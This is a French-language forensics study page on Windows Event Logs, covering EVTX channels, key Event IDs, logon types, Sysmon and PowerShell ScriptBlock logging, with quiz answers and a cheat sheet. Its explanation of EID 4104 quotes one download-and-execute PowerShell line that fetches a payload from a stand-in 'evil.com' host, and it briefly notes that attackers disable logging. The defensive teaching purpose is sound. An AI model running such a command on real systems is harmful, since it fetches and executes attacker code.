📋 Event Logs Windows — La caisse noire de l'OS
Les Event Logs Windows constituent l'équivalent forensique d'une caisse noire d'avion — un système d'enregistrement automatique qui capture en continu les événements de sécurité, système, et applications. Format moderne EVTX (XML binaire, depuis Vista/2008) remplaçant l'ancien EVT (jusqu'à XP/2003). Stockés dans C:\Windows\System32\winevt\Logs\, ils sont organisés en centaines de canaux. Les 3 canaux essentiels : Security.evtx (authentifications, accès, audit), System.evtx (services, drivers, démarrage/arrêt), Application.evtx (applications). Mais en environnement professionnel, des dizaines de canaux complémentaires existent : Microsoft-Windows-PowerShell/Operational (commandes PS, EID 4104 = goldmine !), Sysmon/Operational (si déployé, hash + PPID), TerminalServices-RemoteConnectionManager (RDP entrants), TaskScheduler/Operational (persistance), etc. Particularités forensiques cruciales : (1) Audit doit être configuré — par défaut, beaucoup d'événements importants (4688 process creation, 5156 connexions réseau) ne sont pas loggés sans activation explicite (Group Policy), (2) Les fichiers EVTX sont verrouillés par le service Event Log lors d'un système live → acquisition via VSS, (3) Volume énorme en entreprise (~10 000 events/heure/poste), d'où l'importance d'outils comme Chainsaw, Hayabusa, EvtxECmd, ou ingestion SIEM (Splunk, Elastic). Sur le terrain : maîtriser les Event IDs critiques (4624/4625/4688/4698/4768/4769/7045/4104) et leurs LogonTypes (Type 3 = SMB réseau, Type 10 = RDP) est essentiel.

💡 PowerShell ScriptBlock Logging (4104) : Même si le script utilise des techniques d'obfuscation (base64, IEX, Invoke-Expression), Windows décode le script avant exécution et l'enregistre décodé dans l'Event 4104. Une des sources forensiques les plus précieuses contre les attaques "living off the land".
🧠 Testez-vous
Vous trouvez sur un serveur 200 EID 4625 en 30 secondes depuis la même IP, puis 1 EID 4624 LogonType 3 réussi. Que se passe-t-il ?Détection · Niveau : facile
Brute force réussi. Pattern classique : (1) 200 échecs en 30 secondes = vélocité non-humaine = automated brute force/spray. (2) Même IP source = un seul attaquant ou outil. (3) EID 4624 LogonType 3 juste après = succès via SMB/réseau (compte trouvé). Procédure d'enquête : (a) Identifier le compte cible (TargetUserName dans les 4625) — souvent admin local ou compte service, (b) Identifier l'IP source (IpAddress) et la résoudre (whois, geolocation), (c) Examiner les SubStatus dans les 4625 : 0xC0000064 = user n'existe pas, 0xC000006A = bad password, 0xC0000234 = account locked. Si on voit beaucoup de 0xC000006A → spray sur compte existant (a deviné). (d) EID 4625 → 4624 sur même compte = preuve de succès. (e) Étapes post-compromission à examiner : EID 4672 (privs admin), 4688 (process créé par l'attaquant), 7045 (service installé), 4698 (task), 4624 sur d'autres machines (lateral movement). Réponse immédiate : (1) Reset password du compte compromis, (2) Bloquer l'IP au firewall, (3) Audit complet du compte (qu'a-t-il fait après login), (4) Vérifier persistance, (5) RAM dump de la machine cible si possible. Prévention : Account Lockout Policy (verrouillage après N échecs), MFA, IP filtering, Windows Defender for Identity.
Quelle différence entre EID 4688 et Sysmon Event 1 ? Pourquoi déployer Sysmon ?Logging · Niveau : moyen
Les deux loggent la création d'un processus, mais avec une granularité très différente. EID 4688 (Security log) est le logging natif Windows : il faut activer « Audit Process Creation » dans la Group Policy + (optionnel) « Include command line ». Champs disponibles : NewProcessId, NewProcessName (chemin exe), TokenElevationType, ProcessCommandLine (si activé), ParentProcessName. Pas de hash, pas de SHA-256. Sysmon Event 1 (Microsoft-Windows-Sysmon/Operational, déployé via System Monitor de Sysinternals) : champs très riches : Image, CommandLine, CurrentDirectory, User, LogonId, TerminalSessionId, IntegrityLevel, Hashes (MD5+SHA-1+SHA-256+IMPHASH), ParentProcessGuid, ParentImage, ParentCommandLine, OriginalFileName. Pourquoi Sysmon est-il préféré en DFIR ? (1) Hash inclus = identification fiable même si fichier renommé, (2) ParentCommandLine = contexte complet du parent (souvent crucial pour comprendre la chaîne), (3) OriginalFileName = le vrai nom de l'exe (mfc.dll renommé en explorer.exe est révélé), (4) IntegrityLevel = détecte les UAC bypass, (5) Configuration fine via XML (filtrage des bruits), (6) Bien plus d'événements (28 types : connexion réseau EID 3, création fichier 11, modif registre 13, raw disk read 9, etc.). Déploiement recommandé : SwiftOnSecurity sysmon-config.xml comme baseline, puis ajustement. NB : Sysmon n'est pas activé par défaut sur Windows, c'est un addon — vérifier sa présence en début d'incident.
Pourquoi l'EID 4104 (PowerShell ScriptBlock) est-il un goldmine forensique contre les attaques modernes ?PowerShell · Niveau : moyen
L'EID 4104 dans Microsoft-Windows-PowerShell/Operational enregistre chaque ScriptBlock PowerShell exécuté — et cruciale-ment, après que Windows l'a décodé. C'est le contournement parfait de l'obfuscation, qui est la technique #1 des attaquants modernes (« living off the land binaries », LOLBins). Comment ça marche : avant qu'un script PowerShell ne soit exécuté, le moteur PowerShell doit le compiler en bytecode interne — ce qui implique de résoudre tous les niveaux d'obfuscation (Base64, gzip, char concatenation, format strings, etc.). Le ScriptBlock Logging capture juste avant l'exécution, donc en clair. Exemples : un attaquant lance powershell -EncodedCommand <long-base64>. Dans EID 4688 on verra juste la ligne de commande encodée. Dans EID 4104, on voit le code décodé : IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1'). Activation requise (par défaut désactivé) : Group Policy Computer Configuration\Policies\Administrative Templates\Windows Components\Windows PowerShell\Turn on PowerShell Script Block Logging. Volume : peut générer beaucoup d'événements en environnement avec scripts admin → filtrer intelligemment dans SIEM. Anti-forensique : un attaquant averti peut désactiver le ScriptBlock Logging au début de son script via $LogPS = ... — détecter cette manœuvre = signal d'attaque sophistiquée. Complément : EID 4103 (Module Logging) capture les pipelines, EID 600/601 (provider) — moins utiles. Outils : EvtxECmd ou Hayabusa avec règles Sigma win_susp_powershell pour détecter automatiquement.
🎓 Exam Tip — Logs Windows / Event IDs

Format : EVTX (Vista/2008+) · binaire XML · C:\Windows\System32\winevt\Logs\

━━ CANAUX PRINCIPAUX ━━

• Security.evtx = authentification, audit (audit doit être activé !)

• System.evtx = services, drivers, démarrage

• Application.evtx = applications, AV, crashes

• Microsoft-Windows-PowerShell/Operational = scripts PS

• Microsoft-Windows-Sysmon/Operational = si Sysmon déployé

• TerminalServices/RemoteConnectionManager = RDP

• TaskScheduler/Operational = tâches planifiées

━━ AUTHENTIFICATION (Security) ━━

• 4624 = logon réussi (avec LogonType)

• 4625 = logon échec (SubStatus = raison)

• 4634/4647 = logoff

• 4648 = creds explicites (runas, mouvement latéral)

• 4672 = privs spéciaux à la connexion (admin)

• 4720 = compte créé · 4732 = ajout groupe Admin

━━ LOGON TYPES (Event 4624) ━━

• Type 2 = Console locale interactive

• Type 3 = Réseau (SMB) ⚠ PtH possible

• Type 4/5 = Batch / Service

• Type 7 = Déverrouillage écran

• Type 10 = RDP / RemoteInteractive ⭐

• Type 11 = CachedInteractive (offline laptop)

━━ PROCESSUS ━━

• 4688 (Security) = ProcessCreate (audit + cmdline si activé)

• Sysmon EID 1 = ProcessCreate avec hash + PPID + ParentCommandLine ⭐

• 4689 = process terminé · 4688→4689 = durée d'exécution

━━ KERBEROS / AD (sur DC) ━━

• 4768 = TGT demandé · 4769 = TGS · 4771 = preauth fail

• 4776 = NTLM validation · 4662 = objet AD accédé

━━ PERSISTANCE ━━

• 7045 (System) = nouveau service ⚠ malware

• 4697 (Security) = service installé (audit)

• 4698 (Security) = tâche planifiée créée

• 106 (TaskScheduler) = task activée

━━ POWERSHELL ━━

• 4104 ⭐ = ScriptBlock (décode obfuscation !) — DOIT être activé

• 4103 = Module Logging (pipeline)

━━ SYSMON (si déployé) ━━

• 1 = ProcessCreate (hash, PPID)

• 3 = Network connection

• 7 = Image loaded (DLL)

• 8 = CreateRemoteThread (injection)

• 11 = File created · 13 = Registry value set

• 22 = DNS query

━━ OUTILS ━━

• Chainsaw (Sigma rules) · Hayabusa (timeline) · EvtxECmd (Eric Zimmerman)

• SIEM (Splunk · Elastic · Sentinel) en environnement entreprise
